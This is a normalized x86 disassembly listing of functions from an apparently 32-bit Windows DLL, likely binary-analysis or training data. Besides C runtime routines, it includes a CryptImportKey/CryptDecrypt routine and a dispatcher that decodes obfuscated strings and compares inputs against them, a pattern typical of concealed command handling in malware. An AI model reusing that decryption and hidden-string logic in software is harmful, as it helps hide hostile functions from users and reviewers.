mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_100328d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086c10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x2
mov esi ecx
xor ebx ebx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10037e00
mov [ ebp - 0x4 ] ebx
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
mov eax 0xf
mov esi 0x10
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x38 ] 0x8
cmp eax esi
jae r-xdata
mov [ ecx + 0x8 ] bl
push 0xffffffff
push ebx
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1005e580
cmp [ ebp - 0x34 ] esi
jb r-xdata
lea ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100187af
add esp 0x4
push edi
push 0x1
push eax
call [ StrToIntExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov al 0x1
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
xor al al
jmp r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100329c9
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov cx [ ebp + 0xe ]
mov eax 0x7ff8
push esi
mov esi eax
and cx si
pop esi
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_10032a4b
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
xor ebx ebx
push ebx
push 0x1
push ebx
mov [ ebp + 0xc ] eax
push ebx
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov esi [ ebp + 0x8 ]
push edi
push [ esi ]
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
push 0x2
mov edi [ edi ]
mov eax [ ebp + 0xc ]
sub eax edi
push eax
mov eax [ esi ]
add eax edi
push ebx
push eax
call sub_1007f940
add esp 0xc
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ edi ]
push [ esi ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push edi
push eax
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
mov [ esi ] eax
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_10032b35
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x34 ]
mov esi ebx
call sub_1001da0a
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x34 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x28 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x34 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_100079d1
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_1002ebcb
add esp 0xc
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x24 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x24 ]
fld [ ecx + 0x10 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x24 ]
call sub_1006299d
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_10032c60
push ebp
mov ebp esp
push 0xffffffff
push sub_10088d3e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov esi [ ebx + 0x4 ]
xor edi edi
mov [ ebp - 0x208 ] ebx
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x204 ] edi
cmp esi edi
jne r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x210 ] ecx
cmp ecx edi
jne r-xdata
lea edx [ ebp - 0x60 ]
lea eax [ edi + 0x6b ]
call sub_10045930
xor eax eax
mov [ ebp - 0x174 ] ax
mov eax edx
mov [ ebp - 0x160 ] 0x7
mov [ ebp - 0x164 ] edi
lea edx [ eax + 0x2 ]
mov eax [ eax ]
lea ecx [ eax + 0x128 ]
add eax 0x12c
mov [ ebp - 0x224 ] eax
lea edx [ ebp - 0x1c ]
mov eax 0x68
mov [ ebp - 0x20c ] ecx
call sub_10045930
lea edx [ ebp - 0x28 ]
mov eax 0x54
call sub_10045930
lea edx [ ebp - 0xa8 ]
mov eax 0xe9
call sub_10045930
lea edx [ ebp - 0x88 ]
mov eax 0xe0
call sub_10045930
lea edx [ ebp - 0x98 ]
mov eax 0xa4
call sub_10045930
lea edx [ ebp - 0xbc ]
mov eax 0x25
call sub_10045930
mov edi [ lstrcmpW@IAT ]
lea edx [ ebp - 0x1c ]
push edx
push esi
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x14d
call sub_10045930
xor eax eax
mov [ ebp - 0x174 ] ax
mov eax edx
mov [ ebp - 0x160 ] 0x7
mov [ ebp - 0x164 ] edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x60 ]
push ecx
lea ecx [ ebp - 0x174 ]
call sub_1005ddc0
lea edx [ ebp - 0x174 ]
mov ecx 0x18
mov [ ebp - 0x4 ] edi
call sub_100205a0
cmp [ ebp - 0x160 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push esi
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x210 ]
dec eax
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x64 ]
push ecx
lea ecx [ ebp - 0x174 ]
call sub_1005ddc0
lea edx [ ebp - 0x174 ]
mov ecx 0x18
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
cmp [ ebp - 0x160 ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x174 ]
push edx
call sub_100187af
add esp 0x4
lea eax [ ebp - 0xa8 ]
push eax
push esi
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0x5e
call sub_10045930
push edx
lea ecx [ ebp - 0x190 ]
call sub_10054d00
mov [ ebp - 0x4 ] 0x5
lea esi [ ebp - 0x218 ]
mov ecx ebx
call sub_1005deb0
mov edx [ eax ]
mov eax [ ebp - 0x224 ]
mov esi [ eax ]
mov [ ebp - 0x210 ] edx
test esi esi
je r-xdata
dec eax
je r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x174 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x88 ]
push eax
push esi
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x210 ]
sub eax 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call sub_10019100
xor esi esi
lea esp [ esp ]
lea esi [ ebp - 0x230 ]
mov ecx ebx
call sub_1006b8a0
mov ebx [ eax ]
mov eax [ ebp - 0x20c ]
call sub_10070a90
lea edi [ ebp - 0x230 ]
mov esi eax
call sub_1004cac0
test esi esi
jne r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0x100
call sub_10045930
mov eax edx
push eax
lea ecx [ ebp - 0x174 ]
call sub_10054d00
lea edx [ ebp - 0x174 ]
mov ecx 0x18
mov [ ebp - 0x4 ] 0x4
call sub_100205a0
lea ecx [ ebp - 0x174 ]
jmp r-xdata
lea ecx [ ebp - 0x98 ]
push ecx
push esi
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x210 ]
sub eax 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
mov [ ebx + 0x8 ] eax
lea edx [ ebp - 0x78 ]
mov eax 0xab
call sub_10045930
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
lea ecx [ ebp - 0x78 ]
push ecx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea edx [ esi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push esi
lea ecx [ ebp - 0x78 ]
push ecx
push eax
mov [ ebx + 0xc ] eax
call sub_1007f5d0
mov edx [ ebp - 0x228 ]
mov edi [ edx ]
add esp 0xc
push ebx
add edi 0x138
call sub_10013870
xor eax eax
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0xc ] 0x0
lea edx [ ebp - 0x50 ]
mov eax 0x13f
call sub_10045930
mov eax edx
push eax
lea ecx [ ebp - 0x190 ]
call sub_10054d00
lea edx [ ebp - 0x190 ]
mov ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
lea ecx [ ebp - 0x190 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10019100
mov [ ebp - 0x204 ] 0x3
jmp r-xdata
lea esi [ ebp - 0x220 ]
mov ecx ebx
call sub_1005deb0
mov esi [ eax ]
lea edi [ ebp - 0x220 ]
call sub_1004b790
mov eax [ ebp - 0x224 ]
push esi
call sub_10059130
jmp r-xdata
test esi esi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x13a
call sub_10045930
mov ecx edx
push ecx
lea ecx [ ebp - 0x1ac ]
call sub_10054d00
mov esi 0x3
lea edx [ ebp - 0x1ac ]
lea ecx [ esi + 0x15 ]
mov [ ebp - 0x4 ] esi
call sub_100205a0
lea ecx [ ebp - 0x1ac ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10019100
mov ebx [ ebp - 0x208 ]
mov [ ebp - 0x204 ] esi
jmp r-xdata
mov ecx [ ebp - 0x208 ]
lea esi [ ebp - 0x238 ]
call sub_1006b8a0
mov esi [ eax ]
lea edi [ ebp - 0x238 ]
call sub_1004cac0
mov eax [ ebp - 0x20c ]
push esi
call sub_10036c10
mov ebx [ ebp - 0x208 ]
jmp r-xdata
lea edx [ ebp - 0xbc ]
push edx
push esi
call edi
test eax eax
je r-xdata
sub eax 0x2
jne r-xdata
lea esi [ ebp - 0x220 ]
mov ecx ebx
call sub_1006b8a0
mov ebx [ eax ]
mov eax [ ebp - 0x20c ]
call sub_10070a90
lea edi [ ebp - 0x220 ]
mov esi eax
call sub_1004cac0
test esi esi
je r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0xd1
call sub_10045930
mov ecx edx
push ecx
lea ecx [ ebp - 0x190 ]
call sub_10054d00
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov ecx [ ebp - 0x210 ]
mov eax [ esi ]
mov ecx [ ecx ]
mov edx [ eax ]
push ecx
push edx
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0xd0 ]
mov eax 0xf2
call sub_10045930
lea edx [ ebp - 0x158 ]
mov eax 0xd5
call sub_10045930
push esi
lea ecx [ ebp - 0x200 ]
call sub_10054d00
push eax
lea edx [ ebp - 0xd0 ]
lea esi [ ebp - 0x1e4 ]
mov [ ebp - 0x4 ] 0x7
call sub_1005bbc0
add esp 0x4
push eax
lea edx [ ebp - 0x158 ]
lea esi [ ebp - 0x1c8 ]
mov [ ebp - 0x4 ] 0x8
call sub_1001ccb0
add esp 0x4
mov edx eax
mov ecx 0x18
mov [ ebp - 0x4 ] 0x9
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x1e4 ]
call sub_10019100
lea ecx [ ebp - 0x200 ]
mov [ ebp - 0x204 ] 0x2
lea esi [ ebp - 0x220 ]
mov ecx ebx
call sub_1006b8a0
mov ebx [ eax ]
mov eax [ ebp - 0x20c ]
call sub_10070a90
lea edi [ ebp - 0x220 ]
mov esi eax
call sub_1004cac0
test esi esi
je r-xdata
mov ebx [ ebp - 0x208 ]
mov [ ebp - 0x204 ] 0x4
jmp r-xdata
mov ecx [ ebp - 0x208 ]
lea esi [ ebp - 0x218 ]
call sub_1006b8a0
mov esi [ eax ]
lea edi [ ebp - 0x218 ]
call sub_1004cac0
mov edx [ ebp - 0x20c ]
push esi
push edx
call sub_1004e5b0
mov ebx [ ebp - 0x208 ]
jmp r-xdata
lea edx [ ebp - 0x190 ]
mov ecx 0x18
call sub_100205a0
lea ecx [ ebp - 0x190 ]
jmp r-xdata
lea edi [ ebp - 0x218 ]
call sub_1004b790
test esi esi
jne r-xdata
mov ecx [ ebp - 0x208 ]
lea esi [ ebp - 0x218 ]
call sub_1006b8a0
mov esi [ eax ]
lea edi [ ebp - 0x218 ]
call sub_1004cac0
mov eax [ ebp - 0x20c ]
mov ecx esi
call sub_10014670
mov ebx [ ebp - 0x208 ]
jmp r-xdata
sub_10033309
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10012bd0
add esp 0xc
mov ecx [ ecx ]
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
mov ecx [ ecx ]
pop ebp
retn 0xc
sub_1003334a
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x254 ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x23c ] eax
call sub_1001da0a
call sub_1006299d
mov [ ebp - 0x264 ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x248 ] 0x0
je r-xdata
xor esi esi
cmp ebx esi
je r-xdata
push esi
call sub_10041a47
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x228 ] esi
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
cmp [ ebp - 0x248 ] 0x0
je r-xdata
inc ebx
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x244 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x244 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x244 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x244 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_10033f5e ]
mov edi [ ebp - 0x21c ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x23c ] 0x0
lea eax [ ebp - 0x254 ]
push eax
movzx eax dl
push eax
call sub_10007b46
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x238 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x238 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jns r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_100803cd
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_100803cd
mov al [ ebx ]
inc ebx
mov [ ebp - 0x240 ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x238 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
add ebx 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add ebx 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x220 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x228 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x228 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x258 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x258 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov ecx [ ebp - 0x210 ]
test cl 0x40
je r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x21c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x274 ] 0x1
mov [ ebp - 0x211 ] dl
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x220 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x220 ]
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push [ ebp - 0x260 ]
call sub_10035d06
and [ ebp - 0x260 ] 0x0
pop ecx
mov eax [ ebp - 0x238 ]
sub eax [ ebp - 0x228 ]
sub eax [ ebp - 0x234 ]
mov [ ebp - 0x268 ] eax
test cl 0xc
jne r-xdata
test ecx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x268 ] eax
jge r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x234 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_10080400
test [ ebp - 0x210 ] 0x8
pop ecx
pop ecx
je r-xdata
mov edi eax
jmp r-xdata
test cl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x254 ]
push eax
push [ ebp - 0x274 ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x268 ]
lea eax [ ebp - 0x280 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
add [ ebp - 0x21c ] 0x4
mov eax [ ebp - 0x21c ]
mov esi [ eax - 0x4 ]
call sub_10066f2d
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x228 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x220 ] ecx
je r-xdata
mov edi [ ebp - 0x21c ]
add edi 0x4
test [ ebp - 0x210 ] 0x810
